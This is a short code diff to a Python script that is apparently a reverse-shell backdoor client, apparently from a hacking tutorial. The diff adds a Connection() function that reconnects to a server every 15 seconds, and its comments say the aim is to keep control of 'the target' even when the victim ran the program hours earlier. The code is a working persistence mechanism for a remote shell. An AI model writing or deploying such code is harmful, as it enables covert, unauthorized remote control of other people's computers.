@@ -1,8 +1,22 @@
-#!/user/bin/python
 
 import socket
 import subprocess
 import json
+import time
+
+def Connection(): # The purpose of this function is to keep our connection persistent either the target end our task  
+	while True:   # or if the target click on the program 3 hours before and we connect after 3 hour later even then 
+		time.sleep(15) # we will be able to connect with the target because of with the help of this function, it 
+		               # will keep connecting us with the target after every 15 seconds. 
+		try:          
+			sock.connect(("127.0.0.1",54321))
+			print("Connection to Server Established")
+			Shell()
+
+		except:
+			Connection()
+
+
 
 def reliable_send(data) :
 	json_data=json.dumps(data)
@@ -33,10 +47,5 @@ def Shell() :
 
 
 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("127.0.0.1",54321))
-print("Connection to Server Established")
-
-
-Shell()
-
+Connection()
 sock.close()
